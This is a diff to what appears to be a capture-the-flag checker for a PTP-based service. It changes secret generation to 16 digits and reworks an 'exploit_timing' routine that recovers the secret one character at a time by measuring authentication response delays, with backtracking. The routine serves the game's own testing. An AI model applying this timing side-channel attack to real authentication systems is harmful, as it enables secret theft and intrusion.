@@ -112,7 +112,7 @@ def generate_port_id():
     return clock_id, port
 
 def generate_secret(length: int):
-    return (''.join(secrets.choice(string.printable) for _ in range(length)))
+    return (''.join(secrets.choice(string.digits) for _ in range(length)))
 
 def generate_timestamp():
     return random.randint(0x0, 0xffffffff * 1000000000) 
@@ -661,7 +661,7 @@ async def putflag_plain(
 ) -> None:
     flag = encode_flag(task.flag, logger)
     clock_id, port = generate_port_id()
-    secret = generate_secret(8)
+    secret = generate_secret(16)
 
     if len(flag) > 128:
         raise InternalErrorException("Encountered flag with unsupported length")
@@ -1034,7 +1034,7 @@ async def exploit_timing(
         tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
 
         # Auth TLV to measure
-        add_auth_tlv(message, "plain", 8)
+        add_auth_tlv(message, "plain", 16)
 
     # End time of last char
     tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
@@ -1046,21 +1046,21 @@ async def exploit_timing(
     secret = bytearray()
 
     async def guess_char(secret):
-        durations = np.empty(len(string.printable))
+        durations = np.empty(len(string.digits))
         i_request = 0
         i_response = 0
 
-        while i_request < len(string.printable):
+        while i_request < len(string.digits):
             j = 0
 
             for tlv in message.get_tlvs():
-                if i_request >= len(string.printable):
+                if i_request >= len(string.digits):
                     break
 
                 if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
                     continue
 
-                character = string.printable[i_request].encode("ascii")
+                character = string.digits[i_request].encode("ascii")
                 finalize_auth_tlv(tlv, request, secret + character)
 
                 if j >= 1:
@@ -1091,7 +1091,7 @@ async def exploit_timing(
                     durations[i_response] = tlv.payload.management.payload.time - last_time
                     i_response += 1
 
-                if i_response >= len(string.printable):
+                if i_response >= len(string.digits):
                     break
                 
                 last_time = tlv.payload.management.payload.time
@@ -1100,28 +1100,28 @@ async def exploit_timing(
         # Optimization: filter out obvious outliers (required for CI)
         durations[durations > np.median(durations) + 5000] = 0
 
-        guess = string.printable[np.argmax(durations)].encode("ascii")
-        sqrt_duration = np.sqrt(np.sum(durations))
+        guess = string.digits[np.argmax(durations)].encode("ascii")
+        avg_duration = np.sum(durations) / len(durations)
 
-        return guess, sqrt_duration, None
+        return guess, avg_duration, None
     
-    sqrt_durations = [0]
+    avg_durations = [-np.inf]
 
     # Likely not as many iterations needed, but I don't want the CI to randomly fail
-    for i in range(100):
-        guess, sqrt_duration, received_flag = await guess_char(bytes(secret))
+    for i in range(1, 200):
+        guess, avg_duration, received_flag = await guess_char(bytes(secret))
 
         if received_flag is not None:
             logger.info(f"Received flag {received_flag} after {i} iterations")
             return received_flag
         
         # Backtracking if we made an error due to noise
-        if np.abs(sqrt_duration - sqrt_durations[-1]) > 100:
+        if avg_duration > avg_durations[-1] + 2000:
             secret += guess
-            sqrt_durations += [sqrt_duration]
+            avg_durations += [avg_duration]
         else:
             secret = secret[:-1]
-            sqrt_durations = sqrt_durations[:-1]
+            avg_durations = avg_durations[:-1]
 
 if __name__ == "__main__":
     checker.run()
